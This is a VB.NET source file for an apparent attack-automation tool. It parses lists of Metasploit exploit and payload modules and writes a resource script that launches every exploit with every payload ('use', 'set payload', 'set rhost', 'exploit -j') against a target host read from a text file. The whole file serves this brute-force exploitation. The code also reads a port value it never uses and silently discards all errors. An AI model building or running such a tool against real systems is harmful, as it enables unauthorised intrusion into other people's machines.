Imports System.IO
Imports System.Text

Public Class Form1

    Dim rhost As String = My.Computer.FileSystem.ReadAllText(Application.StartupPath & "\RHOST.txt")
    Dim rport As String = My.Computer.FileSystem.ReadAllText(Application.StartupPath & "\RPORT.txt")

    Private Sub Form1_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        If My.Computer.FileSystem.FileExists(Application.StartupPath & "\finalscript.txt") Then
            My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\finalscript.txt", FileIO.UIOption.OnlyErrorDialogs, FileIO.RecycleOption.DeletePermanently)
        End If
        Dim myFileStream As FileStream
        Dim myStreamReader As StreamReader

        Dim StreamEncoding As Encoding
        StreamEncoding = Encoding.Default

        Try
            myFileStream = New FileStream(Application.StartupPath & "\a.txt", FileMode.Open, FileAccess.Read)
            myStreamReader = New StreamReader(myFileStream, StreamEncoding)
            Dim c As New StringBuilder
            While myStreamReader.Peek <> -1
                Dim a As String = myStreamReader.ReadLine
                Dim b() As String = a.Split(" ")
                For i = 0 To b.Length - 1
                    If b(i).Contains("/") Then
                        c.AppendLine(b(i))
                        Exit For
                    End If
                Next
            End While

            My.Computer.FileSystem.WriteAllText(Application.StartupPath & "\exploits.txt", c.ToString, False)
            elaborapayloads()

        Catch ex As Exception

        Finally
            myStreamReader.Close()
            myFileStream.Close()
        End Try

    End Sub

    Public Sub elaborapayloads()
        Dim myFileStream As FileStream
        Dim myStreamReader As StreamReader

        Dim StreamEncoding As Encoding
        StreamEncoding = Encoding.Default

        Try
            myFileStream = New FileStream(Application.StartupPath & "\b.txt", FileMode.Open, FileAccess.Read)
            myStreamReader = New StreamReader(myFileStream, StreamEncoding)
            Dim c As New StringBuilder
            While myStreamReader.Peek <> -1
                Dim a As String = myStreamReader.ReadLine
                Dim b() As String = a.Split(" ")
                For i = 0 To b.Length - 1
                    If b(i).Contains("/") Then
                        c.AppendLine(b(i))
                        Exit For
                    End If
                Next
            End While

            My.Computer.FileSystem.WriteAllText(Application.StartupPath & "\payloads.txt", c.ToString, False)
            leggiexploits()

        Catch ex As Exception

        Finally
            myStreamReader.Close()
            myFileStream.Close()
        End Try
    End Sub

    Public Sub leggiexploits()
        Dim myFileStream As FileStream
        Dim myStreamReader As StreamReader

        Dim StreamEncoding As Encoding
        StreamEncoding = Encoding.Default

        Try
            myFileStream = New FileStream(Application.StartupPath & "\exploits.txt", FileMode.Open, FileAccess.Read)
            myStreamReader = New StreamReader(myFileStream, StreamEncoding)
            Dim c As New StringBuilder
            While myStreamReader.Peek <> -1
                leggipayloads(myStreamReader.ReadLine)
            End While

        Catch ex As Exception

        Finally
            myStreamReader.Close()
            myFileStream.Close()
        End Try
    End Sub

    Public Sub leggipayloads(ByVal exploit As String)
        Dim myFileStream As FileStream
        Dim myStreamReader As StreamReader

        Dim StreamEncoding As Encoding
        StreamEncoding = Encoding.Default

        Try
            myFileStream = New FileStream(Application.StartupPath & "\payloads.txt", FileMode.Open, FileAccess.Read)
            myStreamReader = New StreamReader(myFileStream, StreamEncoding)
            Dim c As New StringBuilder
            While myStreamReader.Peek <> -1
                Dim payload As String = myStreamReader.ReadLine
                If exploit.Contains(".txt") Then
                Else
                    If payload.Contains(".txt") Then
                    Else
                        c.AppendLine("use " & exploit)
                        c.AppendLine("set payload " & payload)
                        c.AppendLine("set rhost " & rhost)
                        c.AppendLine("exploit -j")
                    End If
                End If
            End While

            My.Computer.FileSystem.WriteAllText(Application.StartupPath & "\finalscript.txt", c.ToString, True)

        Catch ex As Exception

        Finally
            myStreamReader.Close()
            myFileStream.Close()
        End Try
    End Sub

End Class
